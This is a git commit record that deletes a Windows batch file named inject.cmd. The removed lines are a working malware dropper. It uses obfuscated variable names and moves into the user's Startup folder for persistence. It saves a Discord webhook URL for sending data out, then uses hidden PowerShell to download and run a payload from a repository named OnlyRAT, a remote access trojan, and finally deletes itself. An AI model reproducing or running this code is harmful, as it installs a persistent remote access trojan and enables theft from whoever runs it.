031a399d8bf50b5a80a6f4474e89303d6c93781c
blousekool <132397759+blousekool@users.noreply.github.com>
2023-08-03 21:03:25 +0200

    Delete inject.cmd

--- bd/inject.cmd
+++
@@ -1,9 +0,0 @@
-@echo off
-set "XNjFYKECht=%cd%"
-set "YKHfpmMRoQ=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
-cd %YKHfpmMRoQ%
-echo https://discord.com/api/webhooks/1108692581765894185/VJnWWFYNCH-kNIS1wdrooCWhPViOiDj7zS76jdp3HS_bC4LfPuxrZxxSTzC9jR2V9BOf > lawFvVTikZ.txt
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/CosmodiumCS/MK01-OnlyRAT/main/payloads/g1.cmd -o wEaoFkNduy.cmd"
-powershell ./wEaoFkNduy.cmd
-cd "%XNjFYKECht%"
-del inject.cmd
